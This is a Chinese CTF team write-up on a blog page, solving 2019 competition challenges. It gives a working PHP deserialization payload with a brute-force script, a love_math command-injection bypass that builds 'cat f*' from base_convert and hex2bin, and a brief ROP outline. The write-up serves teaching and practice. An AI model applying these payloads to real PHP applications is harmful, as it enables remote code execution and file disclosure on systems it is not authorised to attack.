<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp | Asuri Team</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。">
<meta property="og:type" content="article">
<meta property="og:title" content="2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp">
<meta property="og:url" content="http://asuri.org/2019/04/22/Asuri_2019/index.html">
<meta property="og:site_name" content="Asuri Team">
<meta property="og:description" content="Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。">
<meta property="og:locale">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2am7bamdvj22800o8495.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aowgd5kej228016u4qq.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aoxcl198j21pu096q4j.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap2m9nm4j22800xo0xu.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap50iza8j20b005m3yi.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5am3uuj20a3062aa1.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5helmoj208d0b3aa8.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5oqogij20ea055jrc.jpg">
<meta property="og:image" content="https://i.loli.net/2019/04/21/5cbbfe4598cd4.png">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g29y0gp6a7j20hg07zgss.jpg">
<meta property="article:published_time" content="2019-04-22T14:20:00.000Z">
<meta property="article:modified_time" content="2023-04-07T12:29:53.466Z">
<meta property="article:author" content="All Members">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2am7bamdvj22800o8495.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  

<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <div id="container">
    

    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Asuri Team</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/members">Members</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Asuri_2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/22/Asuri_2019/" class="article-date">
  <time datetime="2019-04-22T14:20:00.000Z" itemprop="datePublished">2019-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。</p>
<a id="more"></a>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h2><p>Index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">$payload &#x3D; $_GET[&quot;payload&quot;];</span><br><span class="line">if(!isset($file))&#123;</span><br><span class="line">	echo &#39;Missing parameter&#39;.&#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">	die(&#39;hack attacked!!!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">if(isset($payload))&#123;  </span><br><span class="line">    $url &#x3D; parse_url($_SERVER[&#39;REQUEST_URI&#39;]);</span><br><span class="line">    parse_str($url[&#39;query&#39;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        if (preg_match(&quot;&#x2F;flag&#x2F;&quot;,$value)) &#123; </span><br><span class="line">    	    die(&#39;stop hacking!&#39;);</span><br><span class="line">    	    exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload &#x3D; unserialize($payload);</span><br><span class="line">&#125;else&#123; </span><br><span class="line">   echo &quot;Missing parameters&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--Please test index.php?file&#x3D;xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>Hint.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="variable">$handle</span>; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从<a target="_blank" rel="noopener" href="https://paper.seebug.org/39/">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a>了解到可以把以下 payload </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Handle&quot;:1:</span><br></pre></td></tr></table></figure>

<p>中的 1 改成比 1 大的数可以在反序列化时绕过<code>__warkeup</code>魔术方法<br>绕过<code>$this-&gt;token === $this-&gt;token_flag</code>的判断可以直接通过爆破来绕过</p>
<p>贴一下脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url =<span class="string">&quot;http://e281a336df8b4ea1b7665704aca7b30246d3cd0663434603.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A3%3A&#123;s%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A&#123;s%3A4%3A%22file%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3Bs%3A10%3A%22token_flag%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3B&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">proxies =&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080/&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000000</span>):</span><br><span class="line">    </span><br><span class="line">    rep = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> rep.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">            print(rep.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(rep.status_code)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rep = requests.get(url)</span></span><br><span class="line"><span class="comment"># print(rep.status_code)</span></span><br></pre></td></tr></table></figure>



<h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>一上午都在懵逼，要么找到可以突破的数学函数，要么突破正则，应该就是这两种思路了。数学函数都看了一遍，貌似没有什么可以利用的函数。正则匹配<code>/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/</code>，这个是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.basics.php">php 变量文档</a>中匹配有效变量名的正则。感觉两个思路都不对…最有可能的还是突破数学函数…数组可以绕之前的，但是<code>eval</code>不能执行</p>
<p>看了好几遍直到看到了<code>base_convert</code>可以在进制转换上做文章，而且根据<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.base-convert.php">php文档–base_convert</a>，我们可以知道</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br></pre></td></tr></table></figure>

<p>也就是第二位，第三位参数可以在 2 到 36 之间，而且高于十进制的用字母表示！既然拼接进去的都是字符串，转换出来拼接进去应该可以执行。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2am7bamdvj22800o8495.jpg"></p>
<p>本地使用<code>base_convert(55490343972,10,36)()</code>成功执行<code>phpinfo</code>，远程也执行了<code>phpinfo</code>看看是不是有什么问题，看了一圈然而并没有发现什么问题。</p>
<p>然后尝试使用各种执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>);	<span class="comment">//cat</span></span><br><span class="line">base_convert(<span class="number">1751504350</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//system</span></span><br><span class="line">base_convert(<span class="number">696468</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//exec</span></span><br><span class="line">base_convert(<span class="number">784</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//ls</span></span><br><span class="line">base_convert(<span class="number">21269</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//GET</span></span><br></pre></td></tr></table></figure>

<p>虽然可以执行<code>ls</code>了，看到了<code>flag.php</code>，但是读不到就比较难受了。然后直接就考虑到了是不是可以有<code>cat *</code>这种操作，但是空格跟<code>*</code>都无法编码…这就比较头疼了。而且主要是还得全为数字，有字母的的话就会进<code>whitelist</code>的判断了。</p>
<p>所以可能要尽量避免去使用十六进制什么的含有字母的，考虑到 ascii 码可以转换，又尝试了使用<code>chr</code>函数去转换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$pi</span>=base_convert(<span class="number">9453</span>,<span class="number">12</span>,<span class="number">36</span>)).<span class="variable">$pi</span>(<span class="number">101</span>).<span class="variable">$pi</span>(<span class="number">120</span>).<span class="variable">$pi</span>(<span class="number">101</span>).<span class="variable">$pi</span>(<span class="number">99</span>)(<span class="variable">$pi</span>(<span class="number">99</span>).<span class="variable">$pi</span>(<span class="number">97</span>).<span class="variable">$pi</span>(<span class="number">116</span>).<span class="variable">$pi</span>(<span class="number">32</span>).<span class="variable">$pi</span>(<span class="number">42</span>))</span><br><span class="line"></span><br><span class="line">(<span class="variable">$pi</span>=base_convert(<span class="number">9453</span>,<span class="number">12</span>,<span class="number">36</span>)).<span class="variable">$pi</span>(<span class="number">101</span>).<span class="variable">$pi</span>(<span class="number">120</span>).<span class="variable">$pi</span>(<span class="number">101</span>).<span class="variable">$pi</span>(<span class="number">99</span>)(<span class="variable">$pi</span>(<span class="number">108</span>).<span class="variable">$pi</span>(<span class="number">115</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">96</span>).<span class="variable">$pi</span>(<span class="number">108</span>).<span class="variable">$pi</span>(<span class="number">115</span>).<span class="variable">$pi</span>(<span class="number">96</span>)</span><br></pre></td></tr></table></figure>

<p>一般的构造结果肯定不行…所以这里想用`ls`这种形式去执行命令，但是由于拼接的原因，一直不能执行…思路卡了很久。</p>
<p>看了一些相关十六进制处理的函数，直到看到了两个函数，一个<code>hex2bin</code>函数，是可以把 16 进制转换成字符串，一个<code>dechex</code>函数，把十进制转换成十六进制。</p>
<p>于是我们可以有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo base_convert(&#39;636174202a&#39;,16,10);</span><br><span class="line">426836762666</span><br><span class="line">php &gt; echo hex2bin(dechex(426836762666));</span><br><span class="line">cat *</span><br></pre></td></tr></table></figure>

<p>这样我们就可以把<code>*</code>这个十六进制为<code>2a</code>的转成十进制纯数字的了。</p>
<p>但是我们要怎么利用<code>hex2bin</code>呢，想到可以利用<code>base_convert</code>赋值变量的方式，找到最短的字符串<code>pi</code>，利用<code>$pi=base_convert(37907361743,10,36)</code>构造出<code>hex2bin</code>。</p>
<p>而且还因为<code>echo</code>可以接受如下的拼接方式，例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> (<span class="number">1</span>).`id`;</span><br><span class="line"><span class="number">1</span>uid=<span class="number">501</span>(zedd) gid=<span class="number">20</span>(staff) groups=<span class="number">20</span>(staff),<span class="number">12</span>(everyone),<span class="number">61</span>(localaccounts),<span class="number">79</span>(_appserverusr),<span class="number">80</span>(admin),<span class="number">81</span>(_appserveradm),<span class="number">98</span>(_lpadmin),<span class="number">501</span>(access_bpf),<span class="number">701</span>(com.apple.sharepoint.group<span class="number">.1</span>),<span class="number">33</span>(_appstore),<span class="number">100</span>(_lpoperator),<span class="number">204</span>(_developer),<span class="number">250</span>(_analyticsusers),<span class="number">395</span>(com.apple.access_ftp),<span class="number">398</span>(com.apple.access_screensharing),<span class="number">399</span>(com.apple.access_ssh)</span><br><span class="line">php &gt; <span class="keyword">echo</span> <span class="number">1</span>,`id`;</span><br><span class="line"><span class="number">1</span>uid=<span class="number">501</span>(zedd) gid=<span class="number">20</span>(staff) groups=<span class="number">20</span>(staff),<span class="number">12</span>(everyone),<span class="number">61</span>(localaccounts),<span class="number">79</span>(_appserverusr),<span class="number">80</span>(admin),<span class="number">81</span>(_appserveradm),<span class="number">98</span>(_lpadmin),<span class="number">501</span>(access_bpf),<span class="number">701</span>(com.apple.sharepoint.group<span class="number">.1</span>),<span class="number">33</span>(_appstore),<span class="number">100</span>(_lpoperator),<span class="number">204</span>(_developer),<span class="number">250</span>(_analyticsusers),<span class="number">395</span>(com.apple.access_ftp),<span class="number">398</span>(com.apple.access_screensharing),<span class="number">399</span>(com.apple.access_ssh)</span><br></pre></td></tr></table></figure>

<p>尽量取最短的，这里肯定我们就用<code>,</code>这个形式。</p>
<p>所以大致思路就差不多出来了利用<code>base_convert</code>构造<code>hex2bin</code>，然后用最短的可以执行命令的<code>exec</code>函数去执行<code>cat *</code>的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(426836762666)))</span><br></pre></td></tr></table></figure>

<p>然而没成功…不知道哪里错了，感觉没道理…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">($pi&#x3D;base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570206167));</span><br><span class="line"></span><br><span class="line">($pi&#x3D;base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570202466));</span><br></pre></td></tr></table></figure>

<p>接着队友说可以用<code>rgrep ag</code>去弄，而且本地打通了…但是远程以上没打通…我又修改了尝试去<code>rgrep fl</code>，也没打通，当时是这样的</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aowgd5kej228016u4qq.jpg"></p>
<p>写 wp 的时候，突然又发现可以打通了…</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aoxcl198j21pu096q4j.jpg"></p>
<p>也是神奇…最后当时还是按照自己的思路去走了，感觉是不是哪里出问题了，确定有<code>flag.php</code>，最后尝试修改<code>cat f*</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo base_convert(&#39;63617420662a&#39;,16,10);</span><br><span class="line">109270211257898</span><br><span class="line">php &gt; echo hex2bin(dechex(109270211257898));</span><br><span class="line">cat f*</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(109270211257898)))</span><br></pre></td></tr></table></figure>

<p>拿到 flag（复现环境下）</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap2m9nm4j22800xo0xu.jpg"></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h2><p>可重复利用的单字节读写的漏洞.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap50iza8j20b005m3yi.jpg"></p>
<p>先直接读取栈上的返回地址泄露<code>pie</code>基址.<br>然后构造<code>ROP</code>链打印库函数地址泄露<code>libc</code>.直接调用<code>system(binsh);</code>获得<code>flag</code>.</p>
